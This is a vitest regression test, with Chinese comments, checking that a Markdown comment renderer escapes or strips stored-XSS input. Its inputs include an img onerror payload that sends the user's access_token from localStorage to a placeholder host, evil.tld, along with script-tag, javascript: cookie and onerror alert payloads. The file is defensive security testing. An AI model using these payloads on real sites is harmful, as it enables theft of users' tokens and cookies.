/**
 * XSS 回归验证（2026-09-30）：确认存储型 XSS 已堵死。
 * 直接用与线上相同的插件链渲染恶意评论内容，断言危险构造不出现在输出里。
 * 跑法（frontend 目录下）：npx vitest run src/__tests__/xss-regression.test.ts
 */
import { describe, it, expect } from 'vitest';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import remarkMath from 'remark-math';
import rehypeKatex from 'rehype-katex';
import rehypeHighlight from 'rehype-highlight';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';

// 与 components/MarkdownContent.tsx 保持一致的 schema（关键部分）
const sanitizeSchema = {
    ...defaultSchema,
    attributes: {
        ...defaultSchema.attributes,
        '*': [...(defaultSchema.attributes?.['*'] ?? []), 'className', 'style', 'id'],
    },
    tagNames: [...(defaultSchema.tagNames ?? []), 'video', 'audio', 'source', 'iframe'],
    protocols: {
        ...defaultSchema.protocols,
        href: ['http', 'https', 'mailto'],
        src: ['http', 'https', 'data'],
    },
};

const render = (md: string, allowHtml: boolean) =>
    renderToStaticMarkup(
        React.createElement(
            ReactMarkdown,
            {
                remarkPlugins: [remarkGfm, remarkMath],
                rehypePlugins: allowHtml
                    ? [rehypeRaw, [rehypeSanitize, sanitizeSchema], rehypeKatex, rehypeHighlight]
                    : [rehypeKatex, rehypeHighlight],
            } as any,
            md
        )
    );

describe('评论 XSS 回归（匿名评论可提交，最易被打）', () => {
    it('allowHtml=false：img onerror 不会变成可执行元素', () => {
        const evil = `<img src=x onerror="fetch('//evil.tld/?t='+localStorage.getItem('access_token'))">`;
        const html = render(evil, false);
        // 判据是"没有真正的 <img 元素"。allowHtml=false 时它会被转义成
        // &lt;img ...&gt; 纯文本，浏览器只当文字显示、不会执行 —— 这就是安全的形态。
        expect(html).not.toMatch(/<img/i);
        expect(html).not.toMatch(/<script/i);
        // 确认确实是被转义保留下来了（而不是被静默吞掉，便于排查用户反馈）
        expect(html).toContain('&lt;img');
    });

    it('allowHtml=false：script 标签不出现在输出', () => {
        const html = render(`<script>alert(1)</script>你好`, false);
        expect(html).not.toMatch(/<script/i);
        expect(html).toContain('你好');
    });

    it('allowHtml=false：javascript: 协议被丢弃', () => {
        const html = render(`[点我](javascript:alert(document.cookie))`, false);
        expect(html).not.toContain('javascript:');
    });

    it('allowHtml=true（文章正文）：仍要消毒掉 onerror 属性', () => {
        const evil = `<img src=x onerror="alert(1)">`;
        const html = render(evil, true);
        // 这里 rehypeRaw 已把它变成真正的元素，所以必须靠 sanitize 剥掉事件属性
        expect(html).not.toMatch(/onerror/i);
    });

    it('allowHtml=true：正常图片与链接仍可用（别把功能一起关掉）', () => {
        const ok = `![图](https://example.com/a.png)\n\n[链接](https://example.com)`;
        const html = render(ok, true);
        expect(html).toContain('https://example.com/a.png');
        expect(html).toContain('https://example.com');
    });
});
